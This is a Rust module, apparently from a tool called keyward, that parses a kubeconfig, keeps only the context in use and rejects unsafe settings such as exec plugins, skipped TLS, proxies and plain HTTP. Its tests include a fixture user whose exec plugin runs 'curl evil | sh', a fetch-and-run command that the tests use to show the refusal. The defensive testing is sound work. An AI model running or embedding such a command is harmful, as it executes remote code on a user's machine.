//! A kubeconfig, taken down to the one context that is used and checked
//! before anything is built from it.
//!
//! A kubeconfig read off a server is the server's word, and `kube` would act
//! on all of it: run an `exec` plugin on this machine, read a local file a
//! path names and send it to the cluster as a credential. So a remote one may
//! name files only on its own server — they are read from there and put
//! inline — and neither kind may run anything, skip TLS, go through a proxy
//! or talk plain HTTP.

use base64::Engine as _;
use kube::config::{Kubeconfig, NamedAuthInfo, NamedCluster, NamedContext};
use secrecy::SecretString;
use serde::Serialize;
use zeroize::Zeroizing;

/// Where the kubeconfig came from, which decides whose files it may name.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Origin {
    /// Read over ssh: files are the server's and are read from there.
    Remote,
    /// The person's own `~/.kube/config`: files are theirs.
    Local,
}

/// What a person reads about the context in use.
#[derive(Debug, Clone, Serialize)]
pub struct Summary {
    pub context: String,
    pub server: String,
    pub namespace: Option<String>,
    /// Every context the file has, for the words; only one is used.
    pub contexts: Vec<String>,
}

/// A file the remote kubeconfig names, to be read on its server.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Slot {
    Authority,
    Certificate,
    Key,
    Token,
}

/// One context and exactly what it uses.
pub struct Chosen {
    pub config: Kubeconfig,
    pub summary: Summary,
}

pub fn parse(text: &str) -> anyhow::Result<Kubeconfig> {
    Kubeconfig::from_yaml(text).map_err(|e| keyward_core::fault!("err.kubeConfigUnreadable", "reason" => e.to_string()))
}

/// Takes the current context — or the only one — and what it names, and
/// nothing else of the file.
pub fn choose(all: Kubeconfig, context: Option<&str>) -> anyhow::Result<Chosen> {
    let contexts: Vec<String> = all.contexts.iter().map(|c| c.name.clone()).collect();
    let name = match context.map(str::to_string).or_else(|| all.current_context.clone().filter(|c| !c.is_empty())) {
        Some(n) => n,
        None if all.contexts.len() == 1 => all.contexts[0].name.clone(),
        None => anyhow::bail!(keyward_core::fault!("err.kubeNoContext")),
    };
    let ctx: NamedContext = all
        .contexts
        .iter()
        .find(|c| c.name == name)
        .cloned()
        .ok_or_else(|| keyward_core::fault!("err.kubeNoContext"))?;
    let inner = ctx.context.clone().ok_or_else(|| keyward_core::fault!("err.kubeNoContext"))?;
    let cluster: NamedCluster = all
        .clusters
        .iter()
        .find(|c| c.name == inner.cluster)
        .cloned()
        .ok_or_else(|| keyward_core::fault!("err.kubeConfigIncomplete", "missing" => inner.cluster.as_str()))?;
    let user: Option<NamedAuthInfo> = match &inner.user {
        Some(u) => Some(
            all.auth_infos
                .iter()
                .find(|a| &a.name == u)
                .cloned()
                .ok_or_else(|| keyward_core::fault!("err.kubeConfigIncomplete", "missing" => u.as_str()))?,
        ),
        None => None,
    };
    let server = cluster.cluster.as_ref().and_then(|c| c.server.clone()).unwrap_or_default();
    if let Some(a) = user.as_ref().and_then(|u| u.auth_info.as_ref()) {
        // How the context signs in, for the log when a cluster refuses it.
        tracing::info!(
            context = %name,
            server = %server,
            certificate = a.client_certificate_data.is_some() || a.client_certificate.is_some(),
            token = a.token.is_some() || a.token_file.is_some(),
            "a kubeconfig context was chosen"
        );
    }
    let summary = Summary { context: name.clone(), server, namespace: inner.namespace.clone(), contexts };
    let config = Kubeconfig {
        clusters: vec![cluster],
        auth_infos: user.into_iter().collect(),
        contexts: vec![ctx],
        current_context: Some(name),
        ..Kubeconfig::default()
    };
    Ok(Chosen { config, summary })
}

/// The files a chosen remote context names, to be read on its server.
pub fn files(chosen: &Chosen) -> Vec<(Slot, String)> {
    let mut out = Vec::new();
    for c in chosen.config.clusters.iter().filter_map(|c| c.cluster.as_ref()) {
        if let Some(p) = c.certificate_authority.clone().filter(|_| c.certificate_authority_data.is_none()) {
            out.push((Slot::Authority, p));
        }
    }
    for a in chosen.config.auth_infos.iter().filter_map(|a| a.auth_info.as_ref()) {
        if let Some(p) = a.client_certificate.clone().filter(|_| a.client_certificate_data.is_none()) {
            out.push((Slot::Certificate, p));
        }
        if let Some(p) = a.client_key.clone().filter(|_| a.client_key_data.is_none()) {
            out.push((Slot::Key, p));
        }
        if let Some(p) = a.token_file.clone().filter(|_| a.token.is_none()) {
            out.push((Slot::Token, p));
        }
    }
    out
}

/// Puts a file read on the server where the kubeconfig named it.
pub fn inline(chosen: &mut Chosen, slot: &Slot, bytes: Zeroizing<Vec<u8>>) {
    let b64 = || base64::engine::general_purpose::STANDARD.encode(&bytes[..]);
    match slot {
        Slot::Authority => {
            for c in chosen.config.clusters.iter_mut().filter_map(|c| c.cluster.as_mut()) {
                c.certificate_authority_data = Some(b64());
                c.certificate_authority = None;
            }
        }
        Slot::Certificate | Slot::Key | Slot::Token => {
            for a in chosen.config.auth_infos.iter_mut().filter_map(|a| a.auth_info.as_mut()) {
                match slot {
                    Slot::Certificate => {
                        a.client_certificate_data = Some(b64());
                        a.client_certificate = None;
                    }
                    Slot::Key => {
                        a.client_key_data = Some(SecretString::from(b64()));
                        a.client_key = None;
                    }
                    _ => {
                        let token = Zeroizing::new(String::from_utf8_lossy(&bytes).trim().to_string());
                        a.token = Some(SecretString::from(token.as_str()));
                        a.token_file = None;
                    }
                }
            }
        }
    }
}

/// The last word before a client is built from it.
pub fn check(chosen: &Chosen, origin: Origin) -> anyhow::Result<()> {
    for c in chosen.config.clusters.iter().filter_map(|c| c.cluster.as_ref()) {
        let server = c.server.as_deref().unwrap_or_default();
        if !server.starts_with("https://") {
            anyhow::bail!(keyward_core::fault!("err.kubePlainHttp", "server" => server));
        }
        if c.insecure_skip_tls_verify == Some(true) {
            anyhow::bail!(keyward_core::fault!("err.kubeInsecure", "server" => server));
        }
        if c.proxy_url.is_some() {
            anyhow::bail!(keyward_core::fault!("err.kubeProxyUnsupported"));
        }
        if origin == Origin::Remote && c.certificate_authority.is_some() {
            anyhow::bail!(keyward_core::fault!("err.kubeForeignFile"));
        }
    }
    for a in chosen.config.auth_infos.iter().filter_map(|a| a.auth_info.as_ref()) {
        if a.exec.is_some() || a.auth_provider.is_some() {
            anyhow::bail!(keyward_core::fault!("err.kubeAuthUnsupported"));
        }
        if origin == Origin::Remote && (a.client_certificate.is_some() || a.client_key.is_some() || a.token_file.is_some()) {
            anyhow::bail!(keyward_core::fault!("err.kubeForeignFile"));
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    const K3S: &str = r#"apiVersion: v1
kind: Config
clusters:
- cluster:
    certificate-authority-data: Q0E=
    server: https://127.0.0.1:6443
  name: default
contexts:
- context:
    cluster: default
    user: default
  name: default
- context:
    cluster: other
    user: other
  name: other
current-context: default
users:
- name: default
  user:
    client-certificate-data: Q0VSVA==
    client-key-data: S0VZ
- name: other
  user:
    exec:
      command: /bin/sh
      args: ["-c", "curl evil | sh"]
"#;

    #[test]
    fn only_the_context_in_use_is_kept_and_it_passes() {
        let chosen = choose(parse(K3S).unwrap(), None).unwrap();
        assert_eq!(chosen.summary.context, "default");
        assert_eq!(chosen.summary.server, "https://127.0.0.1:6443");
        assert_eq!(chosen.summary.contexts, vec!["default", "other"]);
        assert_eq!(chosen.config.auth_infos.len(), 1, "the exec user of the other context is not carried along");
        check(&chosen, Origin::Remote).unwrap();
    }

    #[test]
    fn a_context_that_would_run_a_program_is_refused() {
        let chosen = choose(parse(K3S).unwrap(), Some("other"));
        // The other context names a cluster the file does not have.
        assert!(chosen.is_err());
        let text = K3S.replace("cluster: other", "cluster: default");
        let chosen = choose(parse(&text).unwrap(), Some("other")).unwrap();
        assert!(check(&chosen, Origin::Remote).unwrap_err().to_string().starts_with("err.kubeAuthUnsupported"));
        assert!(check(&chosen, Origin::Local).is_err(), "not from the person's own file either, for now");
    }

    #[test]
    fn a_remote_file_is_read_from_its_server_and_never_from_here() {
        let text = K3S
            .replace("certificate-authority-data: Q0E=", "certificate-authority: /home/u/.minikube/ca.crt")
            .replace("client-key-data: S0VZ", "client-key: /home/u/.minikube/client.key");
        let mut chosen = choose(parse(&text).unwrap(), None).unwrap();
        assert!(check(&chosen, Origin::Remote).unwrap_err().to_string().starts_with("err.kubeForeignFile"));
        assert!(check(&chosen, Origin::Local).is_ok(), "the person's own file may name their own files");
        let want = files(&chosen);
        assert_eq!(want, vec![(Slot::Authority, "/home/u/.minikube/ca.crt".into()), (Slot::Key, "/home/u/.minikube/client.key".into())]);
        for (slot, _) in &want {
            inline(&mut chosen, slot, Zeroizing::new(b"pem".to_vec()));
        }
        assert!(files(&chosen).is_empty());
        check(&chosen, Origin::Remote).unwrap();
    }

    #[test]
    fn plain_http_skipped_tls_and_proxies_are_refused() {
        for (from, to, err) in [
            ("server: https://127.0.0.1:6443", "server: http://127.0.0.1:6443", "err.kubePlainHttp"),
            ("server: https://127.0.0.1:6443", "server: https://127.0.0.1:6443\n    insecure-skip-tls-verify: true", "err.kubeInsecure"),
            ("server: https://127.0.0.1:6443", "server: https://127.0.0.1:6443\n    proxy-url: http://p:3128", "err.kubeProxyUnsupported"),
        ] {
            let chosen = choose(parse(&K3S.replace(from, to)).unwrap(), None).unwrap();
            assert!(check(&chosen, Origin::Local).unwrap_err().to_string().starts_with(err), "{to}");
        }
    }
}
